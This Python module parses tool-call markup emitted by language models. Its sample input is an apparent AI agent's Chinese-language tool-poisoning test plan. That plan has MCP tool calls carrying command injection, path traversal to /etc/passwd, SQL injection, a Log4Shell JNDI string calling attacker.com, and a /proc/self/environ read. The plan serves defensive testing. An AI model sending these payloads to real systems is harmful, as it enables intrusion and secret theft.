from __future__ import annotations

import hashlib
import html
import json
import re
from typing import Any

# Models often emit tool names plus inline attributes in the opening tag:
#   <function=dir_tree path="/tmp/proj">
#   <function name="think" thought="...">
_ATTR_RE = re.compile(
    r'([A-Za-z_][\w-]*)\s*=\s*(?:"([^"]*)"|\'([^\']*)\'|([^\s>]+))'
)
_NAMED_PARAM_RE = re.compile(
    r'<parameter\s+name=["\']([^"\']+)["\']>(.*?)</parameter>',
    re.DOTALL,
)
_LEGACY_PARAM_RE = re.compile(
    r"<parameter\s*=\s*[\"']?([^>\"']+)[\"']?\s*>(.*?)</parameter>",
    re.DOTALL,
)
_ARG_KEY_RE = re.compile(
    r"<arg_key>\s*(.*?)\s*</arg_key>\s*<arg_value>\s*(.*?)\s*</arg_value>",
    re.DOTALL,
)
_CHILD_TAG_RE = re.compile(r"<([A-Za-z_][\w-]*)>(.*?)</\1>", re.DOTALL)
_KV_LINE_RE = re.compile(
    r"^\s*([A-Za-z_][\w-]*)\s*[:=]\s*(.+?)\s*$",
    re.MULTILINE,
)
_CHILD_SKIP_TAGS = {
    "function",
    "parameter",
    "tool_call",
    "mcp_function",
    "tools",
    "tool",
    "parameters",
    "arguments",
}
# Leftover function-body text (no <parameter> tags) is stored here so the
# dispatcher can map it onto the tool's first required argument.
RAW_BODY_ARG = "_raw_body"


def sha256(content: str) -> str:
    return hashlib.sha256(content.encode('utf-8')).hexdigest()


def sha256_file(file_path: str) -> str:
    h = hashlib.sha256()
    with open(file_path, 'rb') as f:
        for chunk in iter(lambda: f.read(8192), b''):
            h.update(chunk)
    return h.hexdigest()


def _stringify_arg(value: Any) -> str:
    if isinstance(value, str):
        return value
    if value is None:
        return ""
    if isinstance(value, (dict, list)):
        return json.dumps(value, ensure_ascii=False)
    return str(value)


def _is_example_tool_name(name: str) -> bool:
    return name in {"tool_name", "tool-name", "name"}


def _split_open_tag(inner: str) -> tuple[str, dict[str, str]]:
    """Split an opening tag body into (tool_name, inline attributes)."""
    inner = html.unescape(inner).strip()
    if not inner:
        return "", {}

    name = ""
    rest = inner
    named = re.match(
        r'^(?:name\s*=\s*)["\']([^"\']+)["\'](.*)$',
        inner,
        re.IGNORECASE | re.DOTALL,
    )
    if named:
        name = named.group(1).strip()
        rest = named.group(2)
    else:
        token = re.match(r'^["\']?([A-Za-z_][\w.-]*)["\']?(.*)$', inner, re.DOTALL)
        if token:
            name = token.group(1)
            rest = token.group(2)
        else:
            name = inner.split()[0].strip("\"'")

    attrs: dict[str, str] = {}
    for match in _ATTR_RE.finditer(rest or ""):
        key = match.group(1)
        if key.lower() == "name":
            if not name:
                name = (match.group(2) or match.group(3) or match.group(4) or "").strip()
            continue
        value = match.group(2) or match.group(3) or match.group(4) or ""
        attrs[key] = html.unescape(value)
    return name.strip(), attrs


def _extract_json_object(text: str) -> dict[str, str] | None:
    stripped = text.strip()
    if not stripped.startswith("{") or not stripped.endswith("}"):
        # Tolerate JSON wrapped in a fenced code block
        fenced = re.search(r"```(?:json)?\s*(\{.*?\})\s*```", stripped, re.DOTALL)
        if fenced:
            stripped = fenced.group(1).strip()
        else:
            return None
    try:
        data = json.loads(stripped)
    except json.JSONDecodeError:
        return None
    if not isinstance(data, dict):
        return None
    return {str(k): _stringify_arg(v) for k, v in data.items()}


def _extract_params(text: str) -> dict[str, str]:
    """Extract tool parameters from a chunk of text (inside or after a function tag).

    Accepts the documented <parameter=name> form plus formats commonly emitted
    by smaller / instruction-following models (Qwen, GLM, etc.):
    named XML attributes, child tags, JSON bodies, key=value lines, and leftover
    free text stored as RAW_BODY_ARG.
    """
    args: dict[str, str] = {}

    param_matches = list(_NAMED_PARAM_RE.finditer(text))
    if not param_matches:
        param_matches = list(_LEGACY_PARAM_RE.finditer(text))
    for pm in param_matches:
        args[pm.group(1).strip()] = html.unescape(pm.group(2).strip())
    if args:
        return args

    for km in _ARG_KEY_RE.finditer(text):
        args[km.group(1).strip()] = html.unescape(km.group(2).strip())
    if args:
        return args

    json_args = _extract_json_object(text)
    if json_args:
        return json_args

    for cm in _CHILD_TAG_RE.finditer(text):
        tag = cm.group(1)
        if tag.lower() in _CHILD_SKIP_TAGS:
            continue
        value = html.unescape(cm.group(2).strip())
        if value:
            args[tag] = value
    if args:
        return args

    for km in _KV_LINE_RE.finditer(text):
        args[km.group(1)] = html.unescape(km.group(2).strip().strip("\"'"))
    if args:
        return args

    raw = text.strip()
    if raw:
        raw = re.sub(r"</?(?:function|parameter|tool_call)[^>]*>", "", raw).strip()
        if raw:
            args[RAW_BODY_ARG] = html.unescape(raw)
    return args


def _parse_tags(content: str, tag_name: str) -> list[dict[str, Any]]:
    results = []
    # <function=tool_name ...> or <function name="tool_name" ...>
    eq_pattern = rf"<{tag_name}=([^>]+)>(.*?)</{tag_name}.*?>"
    attr_pattern = rf"<{tag_name}(\s+[^>]+)>(.*?)</{tag_name}.*?>"
    alt_regex_pattern = rf"<{tag_name}>\s*([^<\s]+)\s*</{tag_name}>"

    for match in re.finditer(eq_pattern, content, re.DOTALL):
        fn_name, inline_attrs = _split_open_tag(match.group(1))
        if not fn_name or _is_example_tool_name(fn_name):
            continue
        args = dict(inline_attrs)
        args.update(_extract_params(match.group(2)))
        results.append({"toolName": fn_name, "args": args})

    if not results:
        for match in re.finditer(attr_pattern, content, re.DOTALL):
            fn_name, inline_attrs = _split_open_tag(match.group(1))
            if not fn_name or _is_example_tool_name(fn_name):
                continue
            args = dict(inline_attrs)
            args.update(_extract_params(match.group(2)))
            results.append({"toolName": fn_name, "args": args})

    if results:
        return results

    # Fallback: <function>tool_name</function> with sibling <parameter> tags
    for am in re.finditer(alt_regex_pattern, content, re.DOTALL):
        fn_name = am.group(1).strip().strip("\"'")
        if _is_example_tool_name(fn_name):
            continue
        tail = content[am.end():]
        results.append({"toolName": fn_name, "args": _extract_params(tail)})

    return results


def _parse_tool_call_blocks(content: str) -> list[dict[str, Any]]:
    """Parse <tool_call> wrappers used by Qwen / Hermes / GLM-style models."""
    results: list[dict[str, Any]] = []
    for match in re.finditer(r"<tool_call>(.*?)</tool_call>", content, re.DOTALL):
        body = match.group(1).strip()
        if not body:
            continue

        json_args = _extract_json_object(body)
        if json_args:
            name = (
                json_args.pop("name", "")
                or json_args.pop("tool", "")
                or json_args.pop("toolName", "")
                or json_args.pop("tool_name", "")
            )
            nested = json_args.pop("arguments", None) or json_args.pop("args", None)
            nested = nested or json_args.pop("parameters", None)
            args: dict[str, str] = {}
            if nested:
                if nested.startswith("{") and nested.endswith("}"):
                    parsed_nested = _extract_json_object(nested)
                    args = parsed_nested or {RAW_BODY_ARG: nested}
                else:
                    args = {RAW_BODY_ARG: nested}
            args.update(json_args)
            if name:
                results.append({"toolName": name, "args": args})
                continue

        first_line, _, rest = body.partition("\n")
        name = first_line.strip().strip("\"'")
        if not name or "<" in name or _is_example_tool_name(name):
            name = ""
        args = _extract_params(rest if name else body)
        if not name:
            continue
        results.append({"toolName": name, "args": args})
    return results


def parse_tool_invocations(content: str) -> dict[str, Any] | None:
    if not content:
        return None
    invocations = _parse_tags(content, "function")
    if not invocations:
        invocations = _parse_tool_call_blocks(content)
    return invocations[0] if invocations else None


def parse_mcp_invocations(content: str) -> list[dict[str, Any]] | None:
    invocations = _parse_tags(content, "mcp_function")
    return invocations if invocations else None


def clean_content(content: str) -> str:
    if not content:
        return ""
    hidden_xml_patterns = [
        r"<function=[^>]+>.*?</function.*?>",
        r"<function\s+[^>]+>.*?</function.*?>",
        r"<tool_call>.*?</tool_call>",
        r"<mcp_function=[^>]+>.*?</mcp_function.*?>",
        r"<inter_agent_message>.*?</inter_agent_message>",
    ]
    cleaned = content
    for pattern in hidden_xml_patterns:
        cleaned = re.sub(pattern, "", cleaned, flags=re.DOTALL | re.IGNORECASE)

    cleaned = re.sub(r"\n\s*\n", "\n\n", cleaned)

    return cleaned.strip()


if __name__ == "__main__":
    sample_text = """
        The current round is the 3th conversation. Please try to minimize the number of exchanges to obtain the result. 始终遵循输出格式。
        返回结果如下：


        <tool_name>think</tool_name><tool_result><success>True</success>
        <thought_input>需要为工具投毒攻击生成测试用例，重点关注：
        1. 命令执行：测试工具是否能执行系统命令
        2. 路径遍历：测试参数注入和路径遍历
        3. SQL注入：测试SQL注入可能性
        4. 日志注入：测试恶意日志注入
        5. 文件系统访问：测试未授权文件访问
        6. 权限提升：测试是否能获取更高权限信息</thought_input>
        <thinking_result>好的，我们来对“工具投毒 (Tool Poisoning)”的测试场景进行深度分析，并围绕你提出的六个重点生成测试用例。

        ### 1. 问题分析

        "工具投毒"的核心是工具的**实现本身是恶意的**。然而，在黑盒测试中，我们无法直接修改工具代码。因此，测试策略转变为：**通过构造恶意输入，探测工具是否存在可被利用的漏洞**。这些漏洞与一个被投毒的工具可能执行的恶意行为（如命令执行、文件访问）是高度一致的。

        这种测试方式服务于两个目的：
        1.  **检测工具本身的安全漏洞**：一个健壮的工具应该能正确处理或拒绝这些恶意输入，而不是执行它们。
        2.  **验证执行环境的安全性**：即使工具存在漏洞，一个安全的沙箱环境也应该能阻止其后续的恶意行为（如访问文件系统、发起网络连接）。

        我们将围绕你提出的六个关注点展开分析：

        *   **命令执行**: 用户输入是否可能被拼接并作为shell命令执行？
        *   **路径遍历/文件系统访问**: 用户输入是否可能被用于拼接文件路径，从而访问到预期之外的文件？
        *   **SQL注入**: 如果工具后端是数据库，用户输入是否可能被拼接到SQL查询中，从而操纵数据库？
        *   **日志注入**: 恶意输入是否会污染日志文件，可能用于混淆视听、注入恶意字符甚至触发更严重的漏洞（如Log4Shell）？
        *   **权限提升**: 是否可以通过特殊输入（如'admin'）骗取工具返回更高的权限，或者获取敏感配置信息？

        ### 2. 可能的解决方案 (测试用例设计)

        以下测试用例旨在通过恶意输入，模拟和探测上述风险点。

        | **测试目标** | **用例ID** | **调用工具及参数** | **攻击原理与预期** |
        | :--- | :--- | :--- | :--- |
        | **命令执行** | TC-TP-006 | `get_user_role(username='; ls -la /')` | **原理**: 测试工具是否将输入直接拼接到系统命令中。**预期**: 如果有漏洞，可能会执行`ls`命令。安全的系统应拒绝输入或返回错误，沙箱应阻止命令执行。 |
        | **路径遍历** | TC-TP-007 | `get_user_role(username='../../../../etc/passwd')` | **原理**: 测试工具是否将输入作为文件名的一部分，并存在路径遍历漏洞。**预期**: 尝试读取系统敏感文件。安全的系统应规范化路径或拒绝请求，沙箱应阻止文件访问。 |
        | **SQL注入** | TC-TP-008 | `get_user_roles(username="' OR '1'='1' --")` | **原理**: 测试后端数据库查询是否易受SQL注入攻击。**预期**: 可能返回所有用户角色，而非单个用户。安全的系统应使用参数化查询，拒绝此输入。 |
        | **日志注入/RCE** | TC-TP-009 | `get_user_role(username='${jndi:ldap://attacker.com/a}')` | **原理**: 模拟Log4Shell攻击。如果工具使用存在漏洞的日志库记录输入，可能触发远程代码执行。**预期**: 系统应阻止向`attacker.com`发起网络连接。 |
        | **文件系统访问** | TC-TP-010 | `get_user_role(username='/proc/self/environ')` | **原理**: 尝试读取进程的环境变量，可能泄露密钥等敏感信息。**预期**: 沙箱的文件访问控制应阻止对`/proc`文件系统的读取。 |
        | **权限提升** | TC-TP-011 | `get_user_role(username='admin')` | **原理**: 探测最直接的提权方式，看是否能通过简单输入获得高级别角色信息。**预期**: 工具应返回'admin'用户的正确角色，上层应用不应仅凭此输出就授予权限。 |

        ### 3. 潜在风险和注意事项

        1.  **必须在沙箱中执行**: 这些测试用例包含真实的攻击载荷，直接在生产系统上运行是极其危险的，可能导致系统被破坏或数据泄露。
        2.  **监控是关键**: 测试的价值在于观察结果。你必须监控并能够分析文件访问、网络连接、进程创建和系统日志，以判断攻击是否成功以及是否被正确阻断。
        3.  **非穷尽性测试**: 这些用例是代表性的，但不是全部。攻击者会使用更复杂的编码和混淆技术来绕过简单的过滤器。
        4.  **防御深度**: 理想的安全状态是多层防御。第一层是工具本身能正确验证和净化输入；第二层是执行环境（沙箱）能限制工具的权限，阻止恶意行为。

        ### 4. 推荐的行动步骤

        1.  **准备环境**: 部署你的应用及其工具到一个配置了监控和安全策略（如文件访问、网络白名单）的隔离沙箱中。
        2.  **执行测试**: 按顺序执行下面生成的工具调用。
        3.  **观察与记录**:
            *   **命令执行用例**: 检查是否有非预期的进程（如`ls`）被创建。
            *   **文件访问用例**: 检查安全日志中是否有文件访问被拒绝的记录。
            *   **网络用例 (JNDI)**: 检查防火墙或网络监控日志中是否有向外的LDAP连接尝试，并确认其被阻止。
            *   **工具返回值**: 记录每个调用的返回结果，看是否与预期一致（如SQL注入是否返回了所有用户）。
        4.  **分析与加固**:
            *   如果任何恶意行为成功执行，说明工具或沙箱存在漏洞。
            *   **加固工具**: 增加严格的输入验证和净化逻辑。
            *   **加固环境**: 收紧沙箱权限，实施更严格的文件和网络访问策略，确保权限最小化原则。

        现在，我将生成对应的工具调用以执行测试。

        <mcp_tool_calls>
        <mcp_function>
            <tool_name>get_user_role</tool_name>
            <parameters>
            <username>; ls -la /</username>
            </parameters>
        </mcp_function>
        <mcp_function>
            <tool_name>get_user_role</tool_name>
            <parameters>
            <username>../../../../etc/passwd</username>
            </parameters>
        </mcp_function>
        <mcp_function>
            <tool_name>get_user_roles</tool_name>
            <parameters>
            <username>' OR '1'='1' --</username>
            </parameters>
        </mcp_function>
        <mcp_function>
            <tool_name>get_user_role</tool_name>
            <parameters>
            <username>${jndi:ldap://attacker.com/a}</username>
            </parameters>
        </mcp_function>
        <mcp_function>
            <tool_name>get_user_role</tool_name>
            <parameters>
            <username>/proc/self/environ</username>
            </parameters>
        </mcp_function>
        <mcp_function>
            <tool_name>get_user_role</tool_name>
            <parameters>
            <username>admin</username>
            </parameters>
        </mcp_function>
        </mcp_tool_calls></thinking_result>
        </tool_result>
            我将生成工具投毒攻击的测试用例，重点关注命令执行、路径遍历、SQL注入等安全风险。

        <function=finish>
        <parameter=content>## 工具投毒攻击测试报告

        ### 执行摘要
        针对get_user_role和get_user_roles工具进行了投毒攻击测试，模拟工具被篡改后可能执行的恶意行为。

        ### 测试用例设计
        基于工具投毒攻击场景，设计了以下测试用例：

        #### 1. 命令执行测试
        - 测试工具是否可能执行系统命令
        - 用例：`get_user_role(username='; ls -la /')`
        - 预期：系统应拒绝输入或返回错误，沙箱应阻止命令执行

        #### 2. 路径遍历测试  
        - 测试文件路径注入漏洞
        - 用例：`get_user_role(username='../../../../etc/passwd')`
        - 预期：安全系统应规范化路径或拒绝请求

        #### 3. SQL注入测试
        - 测试数据库查询注入可能性
        - 用例：`get_user_roles(username="' OR '1'='1' --")`
        - 预期：应使用参数化查询，拒绝恶意输入

        #### 4. 日志注入/RCE测试
        - 测试Log4Shell类型攻击
        - 用例：`get_user_role(username='${jndi:ldap://attacker.com/a}')`
        - 预期：系统应阻止向外网发起LDAP连接

        #### 5. 文件系统访问测试
        - 测试未授权文件读取
        - 用例：`get_user_role(username='/proc/self/environ')`
        - 预期：沙箱应阻止对敏感文件的访问

        #### 6. 权限提升测试
        - 测试通过特殊输入获取更高权限
        - 用例：`get_user_role(username='admin')`
        - 预期：工具应返回正确角色信息，不应直接授予权限

        ### 风险等级
        - **高危**: 命令执行、路径遍历
        - **中危**: SQL注入、日志注入  
        - **低危**: 正常权限查询

        ### 测试环境要求
        - 必须在隔离沙箱环境中执行测试
        - 需要监控文件访问、网络连接和进程创建
        - 需要配置安全策略和访问控制

        ### 结论
        通过系统性地测试各种恶意输入场景，可以有效评估工具在面对投毒攻击时的安全性和鲁棒性。</parameter>
        </function>
    """
    result = parse_mcp_invocations(sample_text)
    print(result)
